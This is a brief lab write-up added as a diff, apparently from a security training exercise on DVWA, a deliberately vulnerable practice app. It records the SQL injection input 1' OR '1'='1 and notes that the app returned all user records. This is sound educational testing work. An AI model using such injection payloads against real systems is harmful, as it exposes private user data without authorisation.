@@ -1,0 +1,17 @@
+Task 3 – SQL Injection (DVWA)
+Successful SQL Injection
+
+Input:
+1' OR '1'='1
+
+Result:
+The application returned multiple user records instead of a single record.
+
+Observed users included:
+- admin
+- Gordon Brown
+- Hack Me
+- Pablo Picasso
+- Bob Smith
+
+This demonstrates that user input can alter the SQL query logic.
